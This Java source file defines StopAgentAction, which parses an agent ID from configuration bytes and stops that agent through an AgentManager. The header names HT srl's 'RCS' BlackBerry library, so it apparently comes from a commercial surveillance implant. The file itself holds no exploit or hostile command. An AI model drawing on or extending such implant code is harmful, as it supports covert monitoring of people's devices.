/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : StopAgentAction.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;

import com.ht.rcs.blackberry.AgentManager;

public class StopAgentAction extends SubAction {

    int agentId;

    public StopAgentAction(int actionId, byte[] confParams) {
        super(actionId);
        Parse(confParams);
    }

    public boolean Execute() {
        debug.info("Stopping " + agentId);
        AgentManager agentManager = AgentManager.getInstance();

        int ret = agentManager.stop(agentId);
        return ret == 1;
    }

    protected boolean Parse(byte[] confParams) {
        DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            agentId = databuffer.readInt();
            debug.trace("agentId: " + agentId);

        } catch (EOFException e) {
            debug.error("params FAILED");
            return false;
        }

        return true;
    }

}
